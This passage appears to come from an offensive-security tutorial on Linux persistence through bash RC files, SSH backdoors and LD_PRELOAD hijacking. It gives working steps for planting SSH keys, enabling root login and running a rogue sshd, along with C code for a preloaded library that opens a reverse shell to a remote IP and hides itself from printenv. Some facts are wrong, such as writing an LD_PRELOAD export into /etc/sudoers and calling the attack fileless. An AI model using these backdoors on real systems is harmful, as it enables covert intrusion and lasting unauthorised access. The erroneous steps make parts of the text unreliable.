##### Pros
- Does not require root access
    - This technique works at the user level making it accessible to attackers with only user privileges.
- Blends in with normal behavior
    - Bash profiles and RC files are common configuration files, making it harder to spot malicious modifications
- Triggers automatically
    - The malicious command runs every time a user logs in or opens the terminal.
- Works remotely
    - If an attacker gains SSH access they can modify these files without requiring physical access to the machine.
##### Cons
- Easily detectable by sysadmins
    - Regular security audits or monitoring can reveal unauthorized modifications.
- Limited to shell users
    - If the user does not login via ssh or open a shell session, the payload will not execute.
- Only affects specific users
    - Unless placed in global files (/etc/profile or /etc/bash.bashrc) the persistence is limited to a single user
- Can be removed by file restoration
    - Users can simply delete or restore their .bashrc or .bash profile to remove persistence.
#### Conclusion
Using bash profile and RC files for persistence is a simple yet effective technique that does not require root privileges. This method allows attackers to execute malicious commands or scripts every time a user logs in or opens a shell session. While easy to implement, it also is relatively easy to detect and mitigate through regular monitoring, proper file permissions, and security auditing tools.
### SSH Backdoors for Persistence
SSH is a widely used protocol for remote access and administration of Linux systems. Attackers who gain access to a machine can establish persistence by modifying SSH configurations, adding malicious keys, or setting up rogue SSH daemons, allowing them to regain access even after the initial compromise is remediated.
#### Methods attackers use to maintain persistence via SSH:
- Attackers can create a backdoor SSH key in ~/.ssh/authorized_keys allowing them to authenticate without a password
```bash
ssh-keygen -t rsa -b 4096 -f attacker_key
```
- This creates two files:
	- Attacker_Key (private key kept by the attacker)
	- Attacker_Key.pub (public key delivered to the target and used for persistence)
	- Attackers then inject the public key into the victim's authorized_keys file
```bash
echo "ssh-rsa <OUTPUT OF CAT /PATH/TO/PUBLIC_KEY>" >> ~/.ssh/authorized_keys
```
```bash
chmod 600 ~/.ssh/authorized_keys
```
- The attacker then logs in from anywhere using the private key 
```bash
ssh -i attacker_key victim@target-machine
```
- Modify the /etc/ssh/sshd_config file to allow unauthorized access
```bash
sudo sed -i 's/#PermitRootLogin prohibit-password/PermitRootLogin yes/' /etc/ssh/sshd_config
```
```bash
sudo systemctl restart ssh
```
- These commands enable SSH root login if it's disabled
```bash
sudo sed -i 's/PasswordAuthentication no/PasswordAuthentication yes/' /etc/ssh/sshd_config
```
```bash
sudo systemctl restart ssh
```
- This enables password authentication even if disabled
```bash
ssh root@victim-machine
```
- The attacker logs into the target machine as root
- Creating a malicious SSH service (backdoor SSH daemon)
```bash
sudo cp /usr/sbin/sshd /tmp/sshd_backdoor
```
- Attacker copies the SSH daemon to a different location
```bash
sudo /tmp/sshd_backdoor -p 2222 -f /etc/ssh/sshd_config -D
```
- attacker starts the malicious SSH daemon on port 2222
```
ssh -p 2222 victim@target-machine
```
- Attacker logs in via the hidden SSH service
- Abusing SSH agent forwarding
```bash
ls -lah /tmp/ | grep ssh-
```
- Attacker lists active SSH agent sockets
```bash
ssh -A attacker@evil-server
```
- Attacker uses he agent to authenticate elswhere
- Attacker now maintains access as long as the session is active
#### Pros & Cons
##### Pros
- Stealth and low detection probability
    - SSH is a standard remote administration tool, so malicious SSH connections blend in with legitimate activity.
    - If attackers use SSH key-based authentication, there are no failed login attempts, making it harder to detect
- Strong & reliable access
    - Unlike some other persistence methods that can be disabled or removed by security tools, SSH access is stable and resilient
    - SSH can persist across reboots without requiring any extra configuration
- Encrypted communications
    - SSH traffic is fully encrypted, making it difficult for network monitoring tools to inspect payloads or commands
    - This helps attackers evade IDS and IPS.
- Flexible access methods
    - Attackers can establish persistence in multiple ways such as
        - Adding SSH keys to authorized_keys
        - Modifying SSH configurations
        - Setting up rogue SSH daemons on alternate ports
        - Hijacking SSH agent forwarding
- Works even with strict user permissions
    - Unlike kernel-based rootkits or malware, SSH backdoors do not always require root access.
    - Attackers can persist as a low-privileged user as long as SSH is enabled for that account.
- Minimal system impact
    - SSH backdoors do not introduce new processes, unusual network traffic, or resource-intensive activity
    - This makes them less likely to trigger EDR alerts.
##### Cons
- Can be easily removed if discovered
    - If defenders check ~/.ssh/authorized_keys. Sshd_config or running services they can easily remove unauthorized keys or stop rogue SSH daemons
    - Security teams can reset SSH configurations to default to evict attackers from compromised systems
- Network based detection is possible
    - While SSH traffic is encrypted, unusual SSH access patterns can trigger security alerts
    - Security teams monitoring SSH connections for failed login attempts or access from suspicious Ips can detect anomalies
- Requires SSH to be enabled
    - Some hardened systems disable SSH by default or restrict it to specific users, making this persistence method impossible.
    - Systems that enforce multi-factor authentication for SSH can block unauthorized access.
- Leaves log artifacts
    - SSH logins and authentication events are logged in /var/log/auth.log or /var/log/secure
    - If defenders review these logs, they can spot unauthorized connections and investigate further.
- Account-based persistence is less reliable
    - If persistence relies on a compromised user account, it can be revoked, disabled or reset, breaking access
    - Attackers may need to compromise multiple accounts to maintain persistence
- Rogue SSH services can be flagged
    - Running a second SSH service on a non-standard port may trigger security alerts or port-scanning detections
    - Tools like Netstat or SS can reveal rogue SSH servers.
#### Conclusion
SSH backdoor persistence is useful for attackers because SSH is a fundamental part of system administration. While modifying authorized_keys is simple and reliable, configuring rogue SSH services or enabling root login can provide deeper persistence. However, these techniques can be detected and mitigated through log analysis, file integrity monitoring and proper SSH hardening.
### LD_PRELOAD Hijacking Persistence
LD_PRELOAD is an environment variable in Linux that allows users to specify a shared library (.so file) to be loaded before any other shared libraries in dynamically linked programs. This feature is intended for debugging and performance optimizations, but it can also be abused by attackers for persistence. By hijacking LD_PRELOAD, an attacker can inject malicious code into system processes or execute a backdoor whenever a targeted program is run.
#### How it's done
- Create a malicious Shared Library (.so file)
    - The attacker writes a shared library that overrides legitimate functions to execute malicious code
    - The following example is a malicious shared library that spawns a reverse shell whenever a user executes a command.
```cpp
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

__attribute__((constructor)) void preload() {
	system("/bin/bash -c 'bash -i >& /dev/tcp/192.168.1.100/4444 0>&1'");
}
```
- shared library is compiled
```bash
gcc -shared -o libmalicious.so -fPIC malicious.c
```
- The attacker sets the LD_PRELOAD to force programs to load the malicious library before legitimate ones
```bash
export LD_PRELOAD=/path/to/libmalicious.so
```
- The attacker modifies the uer's profile configuration files so that LD_PRELOAD is set on every login for the user or for root if they have root privileges
```bash
echo 'export LD_PRELOAD=/path/to/libmalicious.so' >> ~/.bashrc
```
```bash
echo 'export LD_PRELOAD=/path/to/libmalicious.so' >> /etc/profile
```
```bash
echo 'export LD_PRELOAD=/path/to/libmalicious.so' >> /etc/bash.bashrc
```
##### Hijacking system binaries
- Attackers can target specific privileged programs like sudo or sshd by forcing them to load the malicious library
- Now whenever any user runs sudo the attackers code executes before normal behavior, potentially allowing privilege escalation
```bash
echo 'export LD_PRELOAD=/path/to/libmalicious.so' >> /etc/sudoers
```
-  Defenders may detect LD_PRELOAD using printenv but attackers can evade detection by removing the LD_PRELOAD from the environment listing with
```cpp
#include <stdlib.h>
void __attribute__((constructor)) hide_env() {
	unsetenv("LD_PRELOAD");
}
```
- This ensures that LD_PRELOAD is set but not visible when defenders check printenv
- Instead of using an obvious location, attackers may place the file in trusted directories
```bash
mv libmalicious.so /usr/local/lib/libc.so.6
```
- They can then modify /etc/id.so.preload (which is readby ld.so at runtime) to force the system to load the malicious library globally
```bash
echo "/usr/local/lib/libc.so.6" >> /etc/ld.so.preload
```
- This approach ensures system-wide persistence and affects all dynamically linked programs
#### Pros & Cons
##### Pros
- Stealthy Execution
    - The attack is fileless (in memory) and doesn’t rely on new processes.
- Low detection rate
    - Most security tools focus on executables, not shared libraries
- High privilege escalation potential
    - Hijacking sudo can grant root access
- Works without modifying binaries
    - No need to alter system files or install malware
- System-wide impact
    - If placed in /etc/ld.so.preload, it affects all dynamic executables
##### Cons
- Does not work on statically linked binaries
    - Programs like busybox do not use dynamic linking
- Easily removed if discovered
    - Unsetting LD_PRELOAD removes persistence
- Requires write access to configuration files
    - Non-root users cannot modify /etc/ld.so.preload
- Can break system functionality
    - A misconfigured library may cause system crashes
- Visible in printenv and ldd outputs
    - Defenders can detect abnormal libraries
#### Conclusion
LD_PRELOAD hijacking is a powerful persistence method that exploits Linux’s dynamic linker to execute malicious code before any legitimate function runs. While it offers stealth, privilege escalation, and system-wide persistence, it is detectable with proper security monitoring.